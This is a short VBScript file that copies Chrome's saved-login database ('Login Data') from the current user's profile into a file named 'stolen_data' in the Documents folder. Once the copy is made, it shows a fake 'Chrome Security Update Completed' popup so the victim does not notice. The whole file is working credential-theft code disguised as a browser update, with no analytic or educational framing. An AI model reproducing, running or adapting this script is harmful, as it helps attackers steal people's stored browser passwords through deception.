Dim fso, shell, source, target, username

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
username = shell.ExpandEnvironmentStrings("%USERNAME%")

source = "C:\Users\" & username & "\AppData\Local\Google\Chrome\User Data\Default\Login Data"
target = "C:\Users\" & username & "\Documents\stolen_data_" & username & ".db"

If fso.FileExists(source) Then
    fso.CopyFile source, target, True
    shell.Popup "Chrome Security Update Completed ✅", 3, "Google Chrome", 64
Else
    shell.Popup "Chrome not installed or data not found.", 3, "Error", 16
End If
